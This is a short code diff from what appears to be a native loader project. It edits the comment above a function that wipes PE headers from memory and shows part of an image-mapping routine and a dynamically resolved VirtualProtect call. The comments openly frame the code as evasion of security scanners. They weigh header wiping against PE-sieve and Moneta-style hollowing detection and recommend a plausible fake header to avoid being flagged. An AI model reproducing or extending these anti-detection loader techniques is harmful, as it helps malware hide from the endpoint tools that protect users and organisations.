@@ -63,10 +63,13 @@ inline void* map_image_into(void* process, void* file_handle, void** base_out,
     return mapped;
 }
 
-// Wipe our own PE headers in memory after init so scanners cannot parse the
-// mapped region as an image. Callers must have parsed everything they need
-// (sections, relocations, entry) BEFORE wiping; unwinding and VAD queries
-// that rely on in-memory headers degrade afterwards, which is the point.
+// POLICY: NOT recommended by default. Research fold-in 2026-09-17: a sanitized
+// header in executable memory is positive evidence of hollowing to
+// PE-sieve/Moneta-class scanners (strictly worse than a recognizable PE
+// against a good scanner), and it breaks RtlLookupFunctionEntry unless
+// RtlAddFunctionTable was registered first. Prefer image-backed mapping with
+// a real, plausible header. Keep this only for adversaries confirmed to be
+// MZ-regex scanners. Callers must parse everything they need BEFORE wiping.
 inline bool wipe_headers(unsigned char* base, nocrt_size header_bytes) {
     const auto vp = (int(__stdcall*)(void*, nocrt_size, unsigned long, unsigned long*))NOCRT_FN(
         "VirtualProtect");
